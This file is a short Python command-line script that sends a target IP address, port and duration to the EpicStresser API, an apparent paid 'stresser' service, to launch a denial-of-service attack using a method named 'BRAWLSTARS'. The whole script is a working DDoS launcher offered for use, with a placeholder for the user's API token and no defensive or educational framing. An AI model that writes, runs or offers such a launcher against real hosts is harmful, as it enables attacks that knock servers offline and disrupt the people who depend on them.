import sys
import requests
from typing import NoReturn

def send_attack(host: str, port: int, duration: int, token: str, method: str) -> None:
    """
    Sends an attack request to the EpicStresser API.
    
    :param host: Target IP address
    :param port: Target port
    :param duration: Duration of the attack in seconds
    :param token: API token for authentication
    :param method: Attack method
    """
    url = f"https://epicstresser.net/api/?token={token}&host={host}&port={port}&time={duration}&method={method}"
    
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        print("[✔] Attack sent successfully!")
    except requests.exceptions.HTTPError as http_err:
        print(f"[✘] HTTP error occurred: {http_err}")
    except requests.exceptions.ConnectionError:
        print("[✘] Connection error. Please check your network.")
    except requests.exceptions.Timeout:
        print("[✘] Request timed out. Try again later.")
    except requests.exceptions.RequestException as err:
        print(f"[✘] An error occurred: {err}")

def validate_args() -> tuple[str, int, int]:
    """
    Validates and parses command-line arguments.
    
    :return: Tuple containing target IP, port, and attack duration.
    """
    if len(sys.argv) != 4:
        print("Usage: python3 script.py <IP> <PORT> <TIME>")
        sys.exit(1)
    
    try:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        duration = int(sys.argv[3])
        return ip, port, duration
    except ValueError:
        print("[✘] Invalid arguments. Ensure PORT and TIME are numbers.")
        sys.exit(1)

def main() -> NoReturn:
    """
    Main execution function.
    """
    API_TOKEN = "YOUR_API_TOKEN"  # Replace with your actual API token
    ATTACK_METHOD = "BRAWLSTARS"  # Replace with the desired attack method
    
    target_ip, target_port, attack_time = validate_args()
    send_attack(target_ip, target_port, attack_time, API_TOKEN, ATTACK_METHOD)
    sys.exit(0)

if __name__ == "__main__":
    main()
